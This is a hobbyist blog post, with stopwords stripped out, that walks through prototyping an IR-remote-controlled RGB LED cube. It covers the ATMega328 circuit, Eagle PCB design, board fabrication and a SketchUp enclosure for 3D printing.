Anti-procrastination box Shortly received following message Hey m big fan anti-procrastination box ve built m web developer actually looking someone could hire make prototype product similar ve constructed need say thrilled remembered hey m engineer Playing around breadboard one thing making commercial-looking prototype quite another one Fortunately wasn first amateur maker wanted go pro thus month later ended working prototype meet Cloister 4 pages notes summing-up informations gleaned around web d like centralize information go pages pages EEVblog forums obscure sub-reddit order find looking means essential guide prototyping anything like told m amateur best re better advised find something wrote wrong would like add something drop line ll correct add right away dummy-prototype MoodCube pedagogic support going develop simple prototype together m strong believer virtues learning example Together design circuit PCBs made specifically product design enclosure generate clean stl files 3d printed incredible product invented surely make fortune MoodCube plastic cube RGB leds embedded 5 6 faces controlled IR remote Arduino standalone circuit proof concept

crystal since IR signal decryption requires precise timing could probably use ATtiny application ATMega328 parts bin Add capacitors stabilize circuit power 9v battery need voltage regulator since want MCU fed 5v arduino us anymore chance MCC7805CT L7800 lying around Verifying bare circuit works intend moving designing PCB PCB design production set minds specific circuit design time make beautiful schematic using Eagle schematic done start make PCB layout Sparkfun wrote guide explaining complete two steps Eagle make circuit schematic make PCB layout find tips eagle tool allowing compute optimal trace width according circuit specifications question ought ask point requirements shape circuit want holes surface mounted components SMD components mean lowering cost assembly high production volumes pick place machine configured able make pretty much quantity ridiculous marginal price increase whereas holes components need places hand places hand reflow oven want make boards probably prefer hole option also good pick intend sell distribute product kit parts solder Always keep mind overall design product might influence form-factor board vice-versa let assume ve answered questions circuit schematic board layout Get files next step actually make board produced call certainly depends requirements projects find info DIY way want produced question go local Chinese company depends rushed local companies usually quick turnaround option comes price example paid 140 ca APCircuits 4 boards top bottom soldermask top silkscreen arrived 5 days later quality boards high standard

design enclosure Enclosure design 3d printing use Sketchup help us CAD job Meshlab verify integrity stl files generated First export model PCB Eagle design around using convenient extension Eagle Browse Sketchup 3d warehouse order find components fill board want course often scale meters ll scale everything Sketchup made architecture modelling purposes optimized sub-meter precision Thus common design meters end scale real size start design enclosure resources helped Youtube video explaining use Sketchup 3d printing Building enclosure using Sketchup check model water tight Various tips tricks helpful guidance regarding move tool sketchup thing get mad know use properly trust find textures models let get back MoodCube need Basically base accommodate circuit battery cube coming top acting light diffuser White acrylic good pick application standard PLA PBS trick well bottom holds top thanks single screw little plastic piece fit slot made top part battery holder didn bother much went model since could find 3d model product easily result satisfied design use Solid Inspector tool check components solids pass test export model stl thanks yet another extension perform last water-tightness test Meshlab whatever CAD software prefer corresponding files found piece advice make extensive use Make component functionality way parts model copies one another ll modify one change applied copies component Plus like programming modularity re-usability key ll really make life easier want print model right re like access 3d printer rely someone else something 3d printed get expensive pretty quickly depending volume model bit baffled price first ll tell thing told re paying plastic used print part also time machine time machinist high depreciation value machine time little rework performed model guy prints pay expertise said keep mind printers print 100 density means model volume 100 cubic centimeters printer rate 1 cc wont end paying 100 filling density usually 15 40 density resistant material paying approximately 15 40 usually fixed starting price added variable one Shapeway big player area find quite expensive Personally prefer go 3dHubs look local actor like strong position negotiate seems lot people trying make little profit 3d printer demand super nice order get good reviews start clientele ends experience regarding topic hope found looking least
